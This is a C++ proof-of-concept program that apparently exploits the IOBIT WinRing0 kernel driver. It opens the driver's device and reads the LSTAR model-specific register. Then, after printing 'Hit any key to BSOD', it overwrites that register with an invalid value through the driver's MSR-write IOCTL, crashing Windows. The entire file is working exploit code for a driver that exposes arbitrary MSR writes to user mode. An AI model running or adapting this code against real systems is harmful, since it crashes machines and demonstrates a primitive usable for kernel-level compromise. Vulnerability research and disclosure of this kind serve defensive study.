#include <windows.h>
#include "ntos.h"
#include <cstdio>

NTSTATUS CallDriver(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG IoControlCode,
    _In_ PVOID InputBuffer,
    _In_ ULONG InputBufferLength,
    _In_opt_ PVOID OutputBuffer,
    _In_opt_ ULONG OutputBufferLength)
{
    BOOL bResult = FALSE;
    IO_STATUS_BLOCK ioStatus;

    return NtDeviceIoControlFile(DeviceHandle,
        NULL,
        NULL,
        NULL,
        &ioStatus,
        IoControlCode,
        InputBuffer,
        InputBufferLength,
        OutputBuffer,
        OutputBufferLength);

}

#define OLS_TYPE 40000

#define IOCTL_OLS_GET_DRIVER_VERSION \
	CTL_CODE(OLS_TYPE, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_OLS_READ_MSR \
	CTL_CODE(OLS_TYPE, 0x821, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_OLS_WRITE_MSR \
	CTL_CODE(OLS_TYPE, 0x822, METHOD_BUFFERED, FILE_ANY_ACCESS)

#pragma pack(push,4)

typedef struct  _OLS_WRITE_MSR_INPUT {
    ULONG		Register;
    ULARGE_INTEGER	Value;
}   OLS_WRITE_MSR_INPUT;

#pragma pack(pop)

int main()
{
    HANDLE deviceHandle = CreateFile(TEXT("\\\\.\\IOBIT_WinRing0_1_3_0"),
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);

    if (deviceHandle == INVALID_HANDLE_VALUE) {
        printf_s("[!] Unable to open device\r\n");
        return -1;
    }
    else {
        printf_s("[+] IOBIT_WinRing0_1_3_0 device opened\r\n");
    }

    DWORD driverVersion = 0;

    NTSTATUS ntStatus = CallDriver(deviceHandle,
        IOCTL_OLS_GET_DRIVER_VERSION,
        &driverVersion,
        sizeof(ULONG),
        &driverVersion,
        sizeof(ULONG));

    if (!NT_SUCCESS(ntStatus)) {
        printf_s("[!] IOCTL_OLS_GET_DRIVER_VERSION failed, NTSTATUS (0x%lX)\r\n", ntStatus);
    }
    else {

        printf_s("[+] WinRing0 version = %lu.%lu.%lu.%lu\r\n",
            (driverVersion >> 24) & 0xFF,
            (driverVersion >> 16) & 0xFF,
            (driverVersion >> 8) & 0xFF,
            (driverVersion) & 0xFF);

    }

    LARGE_INTEGER msr;
    ULONG lstar = 0xC0000082;

    msr.QuadPart = 0;

    ntStatus = CallDriver(deviceHandle,
        IOCTL_OLS_READ_MSR,
        &lstar,
        sizeof(ULONG),
        &msr,
        sizeof(msr));

    if (!NT_SUCCESS(ntStatus)) {
        printf_s("[!] IOCTL_OLS_READ_MSR failed, NTSTATUS (0x%lX)\r\n", ntStatus);
    }

    printf_s("[+] LSTAR = 0x%p\r\n", (PVOID)msr.QuadPart);

    printf_s("[+] Hit any key to BSOD\r\n");
    system("pause");

    OLS_WRITE_MSR_INPUT inBuf;

    inBuf.Register = lstar;
    inBuf.Value.HighPart = 0xFFFFFFFF;
    inBuf.Value.LowPart = 0xFFFFFFFF;

    SetThreadAffinityMask(GetCurrentThread(), (DWORD)-1);

    ntStatus = CallDriver(deviceHandle,
        IOCTL_OLS_WRITE_MSR,
        &inBuf,
        sizeof(inBuf),
        &lstar,
        sizeof(lstar));

    if (!NT_SUCCESS(ntStatus)) {
        printf_s("[!] IOCTL_OLS_WRITE_MSR failed, NTSTATUS (0x%lX)\r\n", ntStatus);
    }

    CloseHandle(deviceHandle);

    return 0;
}
